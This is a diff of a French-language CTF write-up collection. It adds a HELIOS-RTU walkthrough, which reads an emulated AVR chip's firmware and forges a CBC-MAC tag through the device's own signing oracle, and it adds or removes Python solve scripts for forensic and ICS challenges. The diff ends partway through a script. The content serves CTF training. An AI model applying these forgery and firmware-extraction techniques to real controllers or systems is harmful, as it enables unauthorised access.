+- GDB Remote Serial Protocol, ChaCha20 (structure RFC 8439), SplitMix64
+
+
 ### Ground Lock
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| reverse | 120 | 163 | ✅ | — | 0xAr3s-root | Chronos Security |
+| reverse | 163 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -3130,11 +3065,76 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Splitmix64 (Steele et al. — le finalizer `mix64` et son inverse)
 
 
+### HELIOS-RTU
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| reverse | 52 | ✅ | — | non | 0xAr3s-root | Ionut Coserea |
+
+#### Énoncé
+
+> A HELIOS GRID remote terminal unit (RTU) exposes a single web service console. Behind it is a real emulated ATmega328P running signed control firmware. The unit issues a service token only for a correctly authenticated control directive — and the authentication key is physically unreadable from outside.
+>
+> Identify the silicon, bring up the one interface on the bench that still answers, recover the application firmware, and produce a valid authentication tag over a control directive carrying the live nonce. Interact only with your assigned instance.
+>
+> Flag format: `CSCTF{...}`
+
+**Fichiers fournis :** instance live uniquement (`http://w01.ctf.chronos-security.ro:34019/` au moment du solve — expirée)
+
+#### En bref
+
+Câbler l'adaptateur AVR ISP sur le header ICSP pour identifier un ATmega328P (`0x1e950f`) à la flash verrouillée, lire les 2 Kio d'application via le bootloader série USB, apprendre de sa trame de contrôle AES-CBC-MAC qu'une directive vaut `frame[16]=0xCC, frame[17]=0x0A, nonce en [18:26]`, et forger le tag avec l'oracle de chiffrement `svc sign` du service lui-même (`tag = sign(b2 XOR sign(b1))`).
+
+#### Démarche
+
+**1. Reconnaissance — un WebSocket, un banc, quatre adaptateurs**
+
+La page est un terminal muet : chaque ligne tapée part verbatim sur `/ws` en JSON, et le banc envoie sur le même socket une ligne `wire $ADAPTER $LEAD:$PIN ...`. `help` expose un vrai CLI `avrdude` (`signature, lfuse/hfuse/efuse/lock, flash, eeprom` lisibles) plus `bench`/`wire` ; `svc` n'existe qu'après le faux `apt install svc` (`nonce | telemetry | sign $REC | exec $FRAME $TAG`). Adaptateurs du banc : AVR ISP (6 fils), câble USB, sonde JTAG, sonde debugWIRE (DW/VCC/GND). Rien ne dit quel câblage est juste — les réponses console sont le seul oracle.
+
+**2. Hypothèse — identifier le silicium, puis essayer chaque transport**
+
+debugWIRE d'abord (`DW→RESET, VCC→5V, GND→GND_A`, `-c jtag2dw`) : `[debugwire] sending BREAK` mais la cible n'assert jamais la ligne dW. L'ISP sur le header ICSP (`MISO/MOSI/SCK/RESET/VCC/GND → ICSP_*`) répond immédiatement : signature `0x1e950f` (**ATmega328P**), `lfuse=FF hfuse=D8 efuse=FD lock=FC`. Les fusibles expliquent le banc : `DWEN=1` (debugWIRE fusible-off — d'où l'absence de sync), `SPIEN=0` (ISP vivant), `BOOTRST=0` avec section boot, et `LB` programmé donc lectures flash ISP en pur `0xFF` (EEPROM aussi). Le JTAG n'existe pas sur un 328P. Le câble USB (`-c arduino`) est l'interface qui répond encore avec de vraies données : le bootloader série renvoie les **2 Kio de firmware application** en flash `0x0000` (tout au-delà de `0x0800`, région de la clé incluse, lit `0xFF`).
+
+Désassemblage (radare2, AVR) de cette application : vecteurs → `main en 0x536` (trame UART `0xAA, type, len, payload`), un cœur AES-128 (`0x39a` chiffrement, `0x2b6` expansion de clé, S-box en flash `0x73`) dont les round keys s'expandent depuis 16 octets copiés de la flash `0x7F00` — précisément la région qu'aucune interface externe ne renverra. Les trames type-5 (payload 48 o) sont vérifiées par AES-CBC-MAC sur le payload, puis exigent `payload[16]==0xCC`, `payload[17]==0x0A`, puis répondent avec le nonce courant de 8 octets (PRNG xorshift32 en SRAM `0x1B0`, graine `0xE98EDACA`). Les commandes service sont la même machine à un niveau d'écart : `svc sign $REC16` est l'AES du dispositif comme oracle de chiffrement (enregistrements commençant `0xCC` refusés), `svc exec $FRAME32 $TAG` est le vérificateur type-5.
+
+**3. Exploitation — forgery CBC-MAC sur nonce live à usage unique**
+
+```bash
+python3 solve/solve.py http://w01.ctf.chronos-security.ro:34019/
+# [*] Live nonce    : ff0e23f621056868
+# [*] Frame         : 00000000000000000000000000000000cc0a$NONCE000000000000
+# [*] CBC-MAC tag   : c7fc… (sign[0] then sign[1 xor sign[0]])
+# [*] exec reply    : service: directive authenticated
+#                     service: control action ISSUE_TOKEN accepted
+#                     service: SERVICE TOKEN = CSCTF{...}
+```
+
+Layout de trame : 16 octets zéro, marqueur directive `CC 0A`, le nonce live (8 octets), 6 octets zéro. Tag : `sign(frame[0:16])`, XOR dans `frame[16:32]`, `sign` à nouveau — la construction CBC-MAC de manuel, calculée via l'oracle puisque la clé elle-même ne quitte jamais le chip (l'extraire n'a jamais été nécessaire). Le nonce est à usage unique et global à l'instance : le lire, faire les deux signs, et `exec` dans la même session, sinon l'unité répond `directive nonce stale`. Un mauvais offset de marqueur répond `frame carries no control directive` ; un mauvais tag répond `directive authentication failed` — les trois erreurs séparent proprement les trois contrôles.
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`flag{...}` (masqué)
+
+#### Ce que j'ai appris
+
+- Les octets fusibles sont une carte du banc : `DWEN`, `SPIEN`, `BOOTRST` et `LB` prédisaient lequel des quatre adaptateurs pouvait marcher avant qu'un seul fil soit tiré — lire `hfuse/lock` d'abord transforme « tout essayer » en checklist.
+- « Physiquement illisible » était littéral et borné : le bootloader renvoie volontiers l'application mais `0xFF`-ise le domicile de la clé en `0x7F00`. Le pivot voulu va d'*extraire la clé* à *utiliser le chiffrement du dispositif comme oracle* — la forgery CBC-MAC a besoin de l'oracle, pas de la clé.
+- Les messages d'erreur sont une spécification de protocole : `authentication failed` (MAC) contre `carries no control directive` (octets marqueurs) contre `nonce stale` (fraîcheur/position) m'ont dit laquelle des trois portes chaque tentative passait, transformant le layout de trame en recherche de 4 essais au lieu d'une devinette.
+
+#### Outils et références
+
+- Python 3 (client `websockets`, protocole ligne WebSocket `/ws`) + `curl` (recon des assets)
+- radare2 (`-a avr`, `aaa`/`pdf`) sur l'application récupérée via bootloader ; sémantique CLI `avrdude` en console
+- Datasheet ATmega328P (signature `0x1E950F`, cartes fusibles/lock-bits, conditions d'entrée debugWIRE/ISP/bootloader), forgery par oracle AES-128 CBC-MAC
+
+
 ### Operation Dawn: Radio Recovery
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| reverse | 120 | 156 | ✅ | — | 0xAr3s-root | Terminal43 |
+| reverse | 156 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -3204,9 +3204,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### PoshTerm
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| reverse | 120 | 126 | ✅ | — | 0xAr3s-root | Swyam Kumar |
+| reverse | 126 | ✅ | — | non | 0xAr3s-root | Swyam Kumar |
 
 #### Énoncé
 
@@ -3289,9 +3289,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### The Lock Box
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| reverse engineering | 120 | 166 | ✅ | — | 0xAr3s-root | Terminal43 |
+| reverse engineering | 166 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -3366,9 +3366,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Operation Blackout
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| ICS | 663 | 138 | ✅| — | 0xAr3s-root | Dragoş Bacitea |
+| ICS | 138 | ✅ | — | non | 0xAr3s-root | Dragoş Bacitea |
 
 #### Énoncé
 
@@ -3452,9 +3452,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Operation Dawn: The Sentry's Model
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| ML | 540 | 261 | ✅| — | 0xAr3s-root | Terminal43 |
+| ML | 261 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -3517,9 +3517,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Command Calendar Reconciliation
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| misc | 120 | 141 | ✅ | — | 0xAr3s-root | Chronos Security |
+| misc | 141 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -3577,9 +3577,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Operation Dawn: The Shared Model
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| misc | 120 | 213 | ✅ | — | 0xAr3s-root | Terminal43 |
+| misc | 213 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -3633,9 +3633,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### The Reconnaissance Plate
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| misc | 120 | 96 | ✅ | — | 0xAr3s-root | — |
+| misc | 96 | ✅ | — | non | 0xAr3s-root | — |
 
 #### Énoncé
 
@@ -3693,9 +3693,9 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 ### Watch List Audit
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| misc | 120 | 243 | ✅ | — | 0xAr3s-root | Terminal43 |
+| misc | 243 | ✅ | — | non | 0xAr3s-root | Terminal43 |
 
 #### Énoncé
 
@@ -3964,132 +3964,6 @@ if __name__ == "__main__":
     main()
 ~~~~
 
-### Phantom Drift — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""phantom-drift: derive the flag from the approved vs. diverted waypoint.
-
-Usage: python3 -I solve.py ../files
-Pure data analysis: the decompiled sources are only read (base64-decoded) and compared.
-"""
-import base64, hashlib, json, math, re, sys
-from pathlib import Path
-
-d = Path(sys.argv[1])
-
-# 0. The .decompiled files carry the source as base64 (to read, not to run).
-for name in ("drone_control.decompiled", "command_backend.decompiled"):
-    src = base64.b64decode(re.search(r'DECODED_CONTENT = "([^"]+)"', (d / name).read_text()).group(1)).decode()
-    print(f"{name}: {len(src)} chars of source", file=sys.stderr)
-
-# 1. Approved waypoint (manifest, also hard-coded in both validators).
-man = json.loads((d / "mission_manifest.json").read_text())
-a_lat, a_lon = man["approved_waypoint_lat"], man["approved_waypoint_lon"]
-
-# 2. The command that was actually sent: one JSON object holding the same fields twice,
-#    snake_case (approved values) and PascalCase (diverted values).
-tel = json.loads((d / "telemetry_logs.json").read_text())
-cmd = next(r for r in tel["readings"] if r.get("phase") == "waypoint_update")
-assert (cmd["waypoint_lat"], cmd["waypoint_lon"]) == (a_lat, a_lon)
-b_lat, b_lon = cmd["WaypointLat"], cmd["WaypointLon"]
-print(f"approved=({a_lat},{a_lon}) diverted=({b_lat},{b_lon})", file=sys.stderr)
-
-# 3. flight_log.bin: 24-byte header then "TAG:xxxxxxxx" XORed with the mission id as key.
-blob = (d / "flight_log.bin").read_bytes()[24:]
-key = man["mission_id"].encode()
-tag = bytes(c ^ key[i % len(key)] for i, c in enumerate(blob)).decode()
-assert tag.startswith("TAG:")
-tag = tag[4:]
-
-
-def haversine(r):
-    p1, p2 = math.radians(a_lat), math.radians(b_lat)
-    h = math.sin((p2 - p1) / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(math.radians(b_lon - a_lon) / 2) ** 2
-    return 2 * r * math.asin(math.sqrt(h))
-
-
-# 4. The statement does not fix the Earth radius: the tag (last 8 hex of the digest) decides.
-for name, r in (("mean 6371000", 6371000), ("WGS84 6378137", 6378137)):
-    s = f"{a_lat:.4f}{a_lon:.4f}{b_lat - a_lat:.6f}{b_lon - a_lon:.6f}{haversine(r):.1f}"
-    h = hashlib.sha256(s.encode()).hexdigest()
-    print(f"R={name}: {s} -> tag {h[-8:]} (expected {tag}) {'OK' if h[-8:] == tag else ''}", file=sys.stderr)
-    if h[-8:] == tag:
-        print("CSCTF{" + h[:16] + "}")
-~~~~
-
-### Silent Breaker — `solve/solve.py`
-
-~~~~python
-#!/usr/bin/env python3
-"""silent-breaker: build the containment report from the case files and submit it.
-
-Usage: python3 -I solve.py http://<host>:<port> [--submit]
-Without --submit only the free GET routes (/files, /events) are used and the report is printed.
-With --submit it also calls /confirm-target (2 attempts!), /query/vpn-window and /submit.
-Each instance is a different case, so everything is derived from that instance's files.
-"""
-import json, re, struct, sys, urllib.parse, urllib.request
-from datetime import datetime, timezone
-
-base = sys.argv[1].rstrip("/")
-
-
-def get(path):
-    with urllib.request.urlopen(base + path, timeout=20) as r:
-        return r.read()
-
-
-def post(path, obj):
-    req = urllib.request.Request(base + path, json.dumps(obj).encode(), {"Content-Type": "application/json"})
-    with urllib.request.urlopen(req, timeout=20) as r:
-        return json.load(r)
-
-
-# 1. Signalling feed -> subscribers using a GT outside GT-0000..GT-0999, joined with the roster.
-events = json.loads(get("/events"))["signalling_events"]
-bad = {e["msisdn"] for e in events if not (m := re.fullmatch(r"GT-(\d{4})(?:-.*)?", e["gt"])) or int(m.group(1)) > 999}
-roster = json.loads(get("/files/roster.json"))["employees"]
-targets = [e for e in roster if e["msisdn"] in bad and e["ot_vpn_access"]]   # only staff with OT-VPN access can matter
-assert len(targets) == 1, targets
-emp = targets[0]["employee_id"]
-print("compromised employee:", emp, file=sys.stderr)
-
-# 2. Historian log -> the QUALITY=SUSPECT run and its frozen value.
-log = get("/files/hmi_monitoring.log").decode()
-suspect = re.findall(r"IOA=(0x[0-9a-f]+) VALUE=([\d.]+)A QUALITY=SUSPECT", log)
-ioa, frozen = suspect[0]
-print(f"suspect run: IOA {ioa}, frozen current {frozen}", file=sys.stderr)
-
-# 3. pcap -> C_SC_NA_1 (type 45) activation from the master (to port 2404): IOA, SCO, wire time.
-pcap = get("/files/iec104_capture.pcap")
-off = 24
-cmd = None
-while off + 16 <= len(pcap):
-    sec, usec, incl, _orig = struct.unpack("<IIII", pcap[off:off + 16])
-    pkt = pcap[off + 16:off + 16 + incl]
-    off += 16 + incl
-    ihl = (pkt[14] & 15) * 4
-    tcp = pkt[14 + ihl:]
-    payload = tcp[(tcp[12] >> 4) * 4:]
-    dport = struct.unpack(">H", tcp[2:4])[0]
-    if dport == 2404 and len(payload) >= 16 and payload[0] == 0x68 and payload[6] == 45 and payload[8] & 0x3F == 6:
-        ioa_w = payload[12] | payload[13] << 8 | payload[14] << 16
-        cmd = (f"{ioa_w:x}", "ON" if payload[15] & 1 else "OFF", datetime.fromtimestamp(sec, timezone.utc).strftime("%H:%M"))
-assert cmd and int(cmd[0], 16) == int(ioa, 16), (cmd, ioa)
-print("breaker command:", cmd, file=sys.stderr)
-
-report = {"ioa_address": cmd[0], "command_qualifier": cmd[1], "command_time_utc": cmd[2],
-          "telemetry_status": frozen, "vpn_session_id": None}
-if "--submit" in sys.argv:
-    print(post("/confirm-target", {"employee_id": emp}), file=sys.stderr)
-    vpn = json.loads(get("/query/vpn-window"))["vpn_sessions"]
-    report["vpn_session_id"] = next(s["session_id"] for s in vpn if s["employee_id"] == emp)
-    print(post("/submit", report))
-else:
-    print(json.dumps(report | {"vpn_session_id": "<from /query/vpn-window after confirm-target>", "employee_id": emp}, indent=1))
-~~~~
-
 ### Afterimage — `solve/solve.py`
 
 ~~~~python
@@ -4178,131 +4052,752 @@ Image.frombytes("RGB", (W, rows), b"".join(img)).save(sys.argv[2])
 print("wrote", sys.argv[2], "- read the recovery key on it")
 ~~~~
 
-### Polyglot Requiem — `solve/solve.py`
+### Briefing for One — `solve/solve.py`
 
 ~~~~python
 #!/usr/bin/env python3
-"""polyglot-requiem: PNG+ZIP polyglot -> SQLite deleted row -> assetsignd's seal scheme.
-
-Usage: python3 -I solve.py ../files/flight-telemetry-sdk
-Nothing is executed: the PNG is parsed by hand, the ZIP is read in memory, the SQLite
-file is searched as raw bytes (the row was deleted, SQLite would not show it), and the
-seal scheme of `assetsignd` (found by static analysis) is re-implemented:
-    msg = reverse(raw_bytes(tag)) || epoch as 8-byte little-endian
-    key = SHA-256(msg);  out[i] = in[i] XOR key[i mod 32]
 """
-import hashlib, io, struct, subprocess, sys, zipfile
-from pathlib import Path
+CSCTF 2026 - Briefing for One (forensics/medium)
+Recover the intruder's routing package and its briefing token.
 
-repo = Path(sys.argv[1])
-png = (repo / "assets/telemetry_icon.png").read_bytes()
+Static / offline only: this script never executes the shortcut or the
+DLL and never contacts a captured address. It only parses files and
+reads the pcapng capture.
 
-# 1. Walk the PNG chunks: tEXt "Provenance" holds the tag; the ZIP is appended after IEND.
-off, tag = 8, None
-while True:
-    n, typ = struct.unpack(">I4s", png[off:off + 8])
-    if typ == b"tEXt":
-        k, _, v = png[off + 8:off + 8 + n].partition(b"\0")
-        if k == b"Provenance":
-            tag = bytes.fromhex(v.decode())
-    off += 12 + n
-    if typ == b"IEND":
-        break
-z = zipfile.ZipFile(io.BytesIO(png[off:]))                  # the "trailing data" is a ZIP
-db = z.read("telemetry_cache.db")
-print(f"tag={tag.hex()} zip members={z.namelist()}", file=sys.stderr)
+Chain (all constants are read from the evidence, not hardcoded):
+  1. briefing.lnk (Shell Link StringData) holds a PowerShell command:
+     permit gate, binding key (Base64), HMAC domain, WebDAV path and
+     the expected SHA-256 of route-update.7z / .dll / route-table.json.
+  2. machine-cryptography.hiv is a saved `Cryptography` subkey (its
+     root *is* Cryptography): MachineGuid lives at the root.
+  3. 7-Zip password = lowercase hex of
+     HMAC-SHA-256(binding_key, UTF8(domain) || 0x00 || UTF8(guid_lower)).
+  4. egress.pcapng: reassemble the GET /ops/route-update.7z response
+     body (the PROPFIND DAV XML bodies export under the same name but
+     fail the hash) and verify it against the LNK hash.
+  5. `7z x -p<password>` (archive reader only), verify both members.
+  6. route-update.dll statically embeds only the JSON prefix
+     `{"schema":1,"briefing_token":"CSCTF{` and the routes suffix; its
+     ApplyRouteTable requires a 192-byte file, that prefix/suffix and
+     32 lowercase hex chars in between. The token is that middle part.
 
-# 2. Deleted row: the cell is still in the page. Record = hdr_len, 0 (NULL id), text, blob.
-i = db.index(b"ci_provenance_seal")
-stype = db[i - 1]                                           # serial type of the blob column
-ct = db[i + 18:i + 18 + (stype - 12) // 2]
-print(f"deleted row ci_provenance_seal: {len(ct)}-byte blob", file=sys.stderr)
+Requires: Python 3 stdlib + a `7z` binary for the encrypted archive.
 
-# 3. Epoch = timestamp of the commit that added the icon (all commits share it anyway).
-epoch = int(subprocess.run(
-    ["git", "--git-dir", str(repo / ".git"), "log", "-1", "--format=%ct", "--", "assets/telemetry_icon.png"],
-    capture_output=True, text=True, check=True).stdout)
+Usage:
+    python3 solve.py [briefing-for-one-....zip | extracted-dir]
 
-key = hashlib.sha256(tag[::-1] + struct.pack("<Q", epoch)).digest()
-print(bytes(c ^ key[j % 32] for j, c in enumerate(ct)).decode())
+Field-guide verification example (published inputs, not case values):
+    key 000102...1f + guid 00112233-4455-6677-8899-aabbccddeeff
+    -> 7dad69912b67470da7713c666337135b568030605bc2e88f99524596366d10d0
+"""
+
+import base64
+import hashlib
+import hmac
+import json
+import os
+import re
+import shutil
+import struct
+import subprocess
+import sys
+import tempfile
+import zipfile
+
+DOMAIN_FALLBACK = "csctf26/briefing-for-one/v1"
+
+
+# ---------------------------------------------------------------- evidence
+
+def load_evidence(argv):
+    candidates = []
+    if len(argv) > 1:
+        candidates.append(argv[1])
+    candidates += [
+        "files/briefing-for-one-5f4125fbb77f625d.zip",
+        "../briefing-for-one-5f4125fbb77f625d.zip",
+        "docs/2026-chronos-csctf/forensics/"
+        "briefing-for-one-5f4125fbb77f625d.zip",
+        "/tmp/opencode/briefing",
+    ]
+    names = ("briefing.lnk", "machine-cryptography.hiv", "egress.pcapng")
+    for path in candidates:
+        if not path:
+            continue
+        if os.path.isdir(path):
+            files = {n: os.path.join(path, n) for n in names}
+            if all(os.path.isfile(p) for p in files.values()):
+                print(f"[*] Loading directory {path}")
+                return {n: open(p, "rb").read() for n, p in files.items()}
+        elif os.path.isfile(path):
+            print(f"[*] Loading {path}")
+            blob = open(path, "rb").read()
+            if path.lower().endswith(".zip"):
+                out = {}
+                with zipfile.ZipFile(path) as zf:
+                    members = {os.path.basename(n): n for n in zf.namelist()}
+                    for n in names:
+                        out[n] = zf.read(members[n])
+                return out
+            raise SystemExit(f"[-] Unsupported input file: {path}")
+    raise SystemExit("[-] Provide the briefing-for-one ZIP or extracted dir")
+
+
+# ---------------------------------------------------------------- LNK
+
+def parse_lnk_command(data):
+    """Extract the PowerShell command from Shell Link StringData."""
+    assert data[:4] == b"\x4c\x00\x00\x00", "not a Shell Link"
+    flags = struct.unpack_from("<I", data, 20)[0]
+    off = 76  # HeaderSize
+    if flags & 0x01:  # HasLinkTargetIDList
+        off += 2 + struct.unpack_from("<H", data, off)[0]
+    if flags & 0x02:  # HasLinkInfo
+        off += struct.unpack_from("<I", data, off)[0]
+    is_unicode = bool(flags & 0x80)
+    strings = {}
+    for bit, label in ((0x04, "name"), (0x08, "relative"), (0x10, "workdir"),
+                       (0x20, "args"), (0x40, "icon")):
+        if flags & bit:
+            count = struct.unpack_from("<H", data, off)[0]
+            off += 2
+            if is_unicode:
+                strings[label] = data[off:off + 2 * count].decode("utf-16le")
+                off += 2 * count
+            else:
+                strings[label] = data[off:off + count].decode()
+                off += count
+    return strings["args"]
+
+
+def lnk_parameters(command):
+    binding_b64 = re.search(r"FromBase64String\('([^']+)'\)", command).group(1)
+    domain = re.search(r"GetBytes\('([^']+)'\+\[char\]0", command)
+    archive_hash = re.search(r"\$aHash='([0-9a-f]{64})'", command).group(1)
+    dll_hash = re.search(
+        r"route-update\.dll'\).*?-ne '([0-9a-f]{64})'", command, re.S).group(1)
+    json_hash = re.search(
+        r"route-table\.json'\).*?-ne '([0-9a-f]{64})'", command, re.S).group(1)
+    arc_name = re.search(r"\\ops\\([^'\\]+\.7z)", command).group(1)
+    return {
+        "binding_key": base64.b64decode(binding_b64),
+        "domain": domain.group(1) if domain else DOMAIN_FALLBACK,
+        "archive_name": arc_name,
+        "archive_hash": archive_hash,
+        "dll_hash": dll_hash,
+        "json_hash": json_hash,
+    }
+
+
+# ---------------------------------------------------------------- hive
+
+def read_machine_guid(hive):
+    """MachineGuid at the root of a saved Cryptography subkey hive.
+
+    Minimal NK/VK reader: root cell offset is at header 0x24, all cell
+    offsets are relative to the first hbin (0x1000).
+    """
+    assert hive[:4] == b"regf", "not a registry hive"
+    base = 0x1000
+    root_nk = base + struct.unpack_from("<I", hive, 0x24)[0] + 4
+    assert hive[root_nk:root_nk + 2] == b"nk", "root is not an NK record"
+    value_count = struct.unpack_from("<I", hive, root_nk + 0x24)[0]
+    value_list = base + struct.unpack_from("<I", hive, root_nk + 0x28)[0] + 4
+    for i in range(value_count):
+        vk_rel = struct.unpack_from("<I", hive, value_list + 4 * i)[0]
+        vk = base + vk_rel + 4
+        assert hive[vk:vk + 2] == b"vk", "value is not a VK record"
+        name_len = struct.unpack_from("<H", hive, vk + 2)[0]
+        name = hive[vk + 20:vk + 20 + name_len].decode()
+        if name != "MachineGuid":
+            continue
+        data_len = struct.unpack_from("<I", hive, vk + 4)[0]
+        data_off = struct.unpack_from("<I", hive, vk + 8)[0]
+        vtype = struct.unpack_from("<I", hive, vk + 12)[0]
+        assert vtype == 1, f"MachineGuid type {vtype}, expected REG_SZ"
+        if data_len & 0x80000000:  # inline data in the offset field
+            raw = struct.pack("<I", data_off)[:data_len & 0x7FFFFFFF]
+        else:
+            raw = hive[base + data_off + 4:base + data_off + 4 + data_len]
+        return raw.decode("utf-16le").strip("\x00").lower()
+    raise ValueError("MachineGuid not found at hive root")
+
+
+# ---------------------------------------------------------------- pcapng
+
+def iter_pcapng_packets(data):
+    if len(data) < 28 or data[:4] != b"\x0a\x0d\x0d\x0a":
+        raise ValueError("not a pcapng file")
+    endian = "<" if data[8:12] == b"\x4d\x3c\x2b\x1a" else ">"
+    off = 0
+    while off + 12 <= len(data):
+        btype, blen = struct.unpack_from(endian + "II", data, off)
+        if blen < 12 or off + blen > len(data):
+            break
+        body = data[off + 8:off + blen - 4]
+        if btype == 0x00000006 and len(body) >= 20:
+            caplen = struct.unpack_from(endian + "I", body, 12)[0]
+            yield body[20:20 + caplen]
+        elif btype == 0x00000003 and len(body) >= 4:
+            caplen = struct.unpack_from(endian + "I", body, 0)[0]
+            yield body[4:4 + caplen]
+        if btype == 0x0A0D0D0A and len(body) >= 4:
+            endian = "<" if body[:4] == b"\x4d\x3c\x2b\x1a" else ">"
+        off += blen
+
+
+def tcp_streams(packets):
+    """Reassemble (client_bytes, server_bytes) per TCP connection."""
+    conns = {}
+    for pkt in packets:
+        if len(pkt) < 14:
+            continue
+        off, ethertype = 14, struct.unpack_from(">H", pkt, 12)[0]
+        while ethertype in (0x8100, 0x88A8) and len(pkt) >= off + 4:
+            ethertype = struct.unpack_from(">H", pkt, off + 2)[0]
+            off += 4
+        if ethertype != 0x0800 or len(pkt) < off + 20 or pkt[off + 9] != 6:
+            continue
+        ihl = (pkt[off] & 0x0F) * 4
+        total = struct.unpack_from(">H", pkt, off + 2)[0]
+        ip_end = off + total if total else len(pkt)
+        src = ".".join(str(b) for b in pkt[off + 12:off + 16])
+        dst = ".".join(str(b) for b in pkt[off + 16:off + 20])
+        tcp = off + ihl
+        if len(pkt) < tcp + 20:
+            continue
+        sport, dport, seq = struct.unpack_from(">HHI", pkt, tcp)
+        doff = ((pkt[tcp + 12] >> 4) & 0xF) * 4
+        payload = pkt[tcp + doff:ip_end]
+        if not payload:
+            continue
+        a, b = (src, sport), (dst, dport)
+        key = (a, b) if a <= b else (b, a)
+        server = b if dport == 80 else a if sport == 80 else None
+        side = "S" if (src, sport) == server else "C"
+        conns.setdefault(key, {"C": [], "S": []})[side].append((seq, payload))
+
+    def reassemble(segments):
+        out, nxt = bytearray(), None
+        for seq, payload in sorted(segments):
+            if nxt is None:
+                nxt = seq
+            if seq > nxt:
+                break  # gap: this capture has none
+            skip = nxt - seq
+            if skip < len(payload):
+                out.extend(payload[skip:])
+                nxt += len(payload) - skip
+        return bytes(out)
+
+    return [(reassemble(v["C"]), reassemble(v["S"])) for v in conns.values()]
+
+
+def recover_archive(pcap, archive_name, expected_hash):
+    target = f"GET /ops/{archive_name} ".encode()
+    for client, server in tcp_streams(iter_pcapng_packets(pcap)):
+        if target not in client:
+            continue
+        head, _, body = server.partition(b"\r\n\r\n")
+        match = re.search(rb"Content-Length:\s*(\d+)", head, re.I)
+        assert match, "GET response without Content-Length"
+        body = body[:int(match.group(1))]
+        digest = hashlib.sha256(body).hexdigest()
+        print(f"[*] GET body     : {len(body)} bytes, sha256={digest}")
+        assert digest == expected_hash, "GET body fails the LNK hash"
+        return body
+    raise ValueError("route archive GET not found in capture")
+
+
+# ---------------------------------------------------------------- package
+
+def extract_archive(archive, password):
+    seven = shutil.which("7z")
+    assert seven, "a 7z binary is required for the encrypted archive"
+    with tempfile.TemporaryDirectory() as tmp:
+        arc_path = os.path.join(tmp, "route-update.7z")
+        open(arc_path, "wb").write(archive)
+        out_dir = os.path.join(tmp, "out")
+        proc = subprocess.run(
+            [seven, "x", f"-p{password}", f"-o{out_dir}", "-y", arc_path],
+            capture_output=True, text=True)
+        assert proc.returncode == 0, f"7z failed: {proc.stdout} {proc.stderr}"
+        dll = open(os.path.join(out_dir, "route-update.dll"), "rb").read()
+        table = open(os.path.join(out_dir, "route-table.json"), "rb").read()
+    return dll, table
+
+
+def briefing_token(dll, table):
+    assert b"ApplyRouteTable" in dll, "export name missing from DLL"
+    prefix = b'{"schema":1,"briefing_token":"CSCTF{'
+    assert prefix in dll, "JSON prefix missing from DLL"
+    suffix_at = dll.find(b'}","routes":[')
+    assert suffix_at >= 0, "JSON suffix missing from DLL"
+    suffix = dll[suffix_at:dll.find(b"\x00", suffix_at)]
+    assert table.startswith(prefix) and table.endswith(suffix), \
+        "route-table.json does not match the DLL prefix/suffix"
+    middle = table[len(prefix):len(table) - len(suffix)]
+    assert len(middle) == 32 and all(
+        chr(c) in "0123456789abcdef" for c in middle), \
+        f"token middle is not 32 lowercase hex: {middle!r}"
+    token = json.loads(table)["briefing_token"]
